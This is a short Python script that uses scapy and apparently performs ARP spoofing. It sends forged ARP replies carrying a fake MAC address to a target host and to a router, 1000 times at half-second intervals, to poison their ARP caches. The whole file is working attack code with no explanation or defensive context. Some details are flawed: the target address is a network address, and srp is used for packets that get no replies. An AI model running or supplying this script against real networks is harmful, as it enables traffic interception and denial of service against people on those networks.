from rich.console import Console
console = Console()


from scapy.all import Ether, ARP, srp
import time

target_ip = "192.168.1.0"
target_mac = "02:1A:7C:4F:9B:3D"

ROUTER_ip = "192.168.1.1"
ROUTER_mac = "06:5F:D2:8E:1C:AA"

fake_mac = "00:12:ff:12:44:12"

packet_for_router = Ether(src=fake_mac, dst=ROUTER_mac) / ARP(psrc=target_ip, pdst=ROUTER_ip, hwsrc=fake_mac, hwdst=ROUTER_mac)
packet_for_node = Ether(src=fake_mac, dst=target_mac) / ARP(psrc=ROUTER_ip, pdst=target_ip, hwsrc=fake_mac, hwdst=target_mac)

send = 0

for send in range(1, 1001):
    srp(packet_for_router)
    srp(packet_for_node)

    time.sleep(.5)


